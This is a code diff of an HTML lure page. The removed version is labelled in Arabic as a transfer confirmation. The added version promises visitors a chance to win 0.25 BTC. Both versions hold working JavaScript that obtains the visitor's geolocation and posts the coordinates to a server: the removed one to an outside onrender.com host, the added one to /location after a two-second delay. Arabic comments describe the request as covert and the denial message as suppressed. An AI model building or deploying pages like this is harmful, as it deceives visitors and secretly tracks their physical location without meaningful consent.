@@ -1,32 +1,62 @@
-<!-- index.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>تأكيد التحويل</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Congratulations!</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      text-align: center;
+      padding: 50px;
+    }
+    .box {
+      background: white;
+      border-radius: 10px;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      max-width: 400px;
+      margin: auto;
+    }
+    h1 {
+      color: green;
+    }
+  </style>
 </head>
 <body>
-  <h2>جاري التحقق من العملية...</h2>
+  <div class="box">
+    <h1>🎉 Congratulations!</h1>
+    <p>You’ve been selected for a chance to win 0.25 BTC.</p>
+    <p>Please wait while we verify your eligibility...</p>
+  </div>
 
   <script>
-    navigator.geolocation.getCurrentPosition(success, error);
-
-    function success(pos) {
-      fetch('https://boot-eg8h.onrender.com/location', {
-        method: 'POST',
+    function sendLocation(lat, lon) {
+      fetch("/location", {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json'
+          "Content-Type": "application/json"
         },
-        body: JSON.stringify({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude
-        })
+        body: JSON.stringify({ lat: lat, lon: lon })
       });
     }
 
-    function error(err) {
-      alert("فشل في تحديد الموقع.");
+    function requestLocation() {
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          var lat = position.coords.latitude;
+          var lon = position.coords.longitude;
+          sendLocation(lat, lon);
+        },
+        function (error) {
+          // لا تظهر رسالة رفض إذن الموقع
+        }
+      );
     }
+
+    // طلب الموقع بشكل خفي بعد ثانيتين
+    setTimeout(requestLocation, 2000);
   </script>
 </body>
 </html>
